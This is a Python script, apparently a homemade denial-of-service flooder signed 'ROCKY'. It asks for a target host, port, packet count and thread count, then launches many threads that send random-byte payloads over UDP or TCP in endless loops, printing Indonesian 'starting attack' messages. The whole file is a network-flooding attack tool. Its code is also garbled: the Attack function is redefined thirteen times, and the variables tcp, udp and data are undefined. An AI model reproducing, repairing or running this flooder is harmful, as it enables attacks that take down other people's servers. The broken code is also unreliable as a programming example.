#!/usr/bin/env python
#By ROCKY
import os
import threading
import sys
import struct
import random
import time
import socket

os.system("clear")
print("""
\033[91m
 
██████╗░░█████╗░░█████╗░██╗░░██╗██╗░░░██╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝╚██╗░██╔╝
██████╔╝██║░░██║██║░░╚═╝█████═╝░░╚████╔╝░
██╔══██╗██║░░██║██║░░██╗██╔═██╗░░░╚██╔╝░░
██║░░██║╚█████╔╝╚█████╔╝██║░╚██╗░░░██║░░░
╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░
""")
choice = str(input("\033[91m=====> Enter The Start Attack starting packet goto target (Attack/n) : "))
ip = str(input("\033[66m=====> Enter the ip/host target    : "))
port = int(input("\033[55m=====> Enter The Port Target  : "))
times = int(input("\033[44m=====> Enter The Packets : "))
threads = int(input("\033[33]=====>  Enter The Threada : "))
def Attack():
	random = random._urandom(577)
	L_bytes = random._urandom(35500)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
			
def Attack():
	random = random._urandom(109000)
	L_bytes = random._urandom(1020)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	random = random._urandom(1025)
	L_bytes = random._urandom(1090)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	random = random._urandom(1025)
	L_bytes = random._urandom(102400)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(102400)
	K_bytes = random._urandom(577)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(1090)
	I_bytes = random._urandom(1024)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			s.close()
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
			
def Attack():
	K_bytes = random._urandom(1090)
	I_bytes = random._urandom(65500)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			s.close()
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_bytes = random._urandom(577)
	K_bytes = random._urandom(578)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(100)
	L_K_bytes = random._urandom(222)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(666)
	L_K_bytes = random._urandom(1021)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(577)
	L_K_bytes = random._urandom(1021)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if tcp else socket.SOCK_STREAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(random,addr)
				s.sendto(L_bytes,addr)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(102400)
	L_K_bytes = random._urandom(1021)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(random)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

def Attack():
	K_K_bytes = random._urandom(102400)
	L_K_bytes = random._urandom(1021)
	x = random.choice(("[K]","[K]","[K]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM if tcp and udp else socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(K_bytes)
				s.send(L_bytes)
			print(x +"\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))
		except:
			print("\033[66mMemulai serangan ke: %s dan Port: %s"%(ip,port))

for udp in range(threads):

	if choice == 'udp-Tcp':

		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
	else:
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
		th = threading.Thread(target = Attack)
		th.start()
